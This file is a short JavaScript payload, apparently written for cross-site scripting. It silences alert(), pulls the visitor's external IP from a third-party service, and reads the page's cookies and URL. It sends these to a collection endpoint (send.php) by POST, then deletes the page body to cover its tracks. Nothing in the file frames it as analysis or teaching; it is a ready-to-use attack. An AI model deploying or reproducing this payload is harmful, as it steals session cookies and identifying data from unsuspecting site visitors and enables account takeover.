alert = function() {};

a = document.createElement('script');
a.src = "https://pv.sohu.com/cityjson";
document.body.appendChild(a);

a = document.createElement("script");
a.src = ""
document.body.appendChild(a);

function formatParams(data) {
    var arr = [];
    for (var name in data) {
        arr.push(encodeURIComponent(name) + "=" + encodeURIComponent(data[name]));
    }
    return arr.join("&");
}

function ajax(options) {
    options = options || {};
    options.type = (options.type || "GET").toUpperCase();
    options.dataType = options.dataType || "json";
    var params = formatParams(options.data);

    if (window.XMLHttpRequest) {
        var xhr = new XMLHttpRequest();
    } else {
        var xhr = new ActiveXObject('Microsoft.XMLHTTP');
    }

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            var status = xhr.status;
            if (status >= 200 && status < 300) {
                options.success && options.success(xhr.responseText, xhr.responseXML);
            } else {
                options.fail && options.fail(status);
            }
        }
    }

    if (options.type == "GET") {
        xhr.open("GET", options.url + "?" + params, true);
        xhr.send(null);
    } else if (options.type == "POST") {
        xhr.open("POST", options.url, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(params);
    }
}

function f(){
	exip = returnCitySN['cip'];
	inip = IN_IP["ip"];
	cookie = document.cookie;
	domain = document.location.href;
	//alert("external ip : [" + exip + "]");
	//alert("internal ip : [" + inip + "]");
	//alert("vul domain : [" + domain + "]");
	ajax({
    		url: "http://localhost/send.php",  
    		type: "POST",                    
    		data: {"exip": exip, "domain": domain, "inip": inip, "cookie": cookie},        
    		dataType: "",
    		success: function (response, xml) {
    		},
    		fail: function (status) {
    		}
	});
	ajax = function() {};
	document.body.remove();
}

window.setTimeout(f, 500)
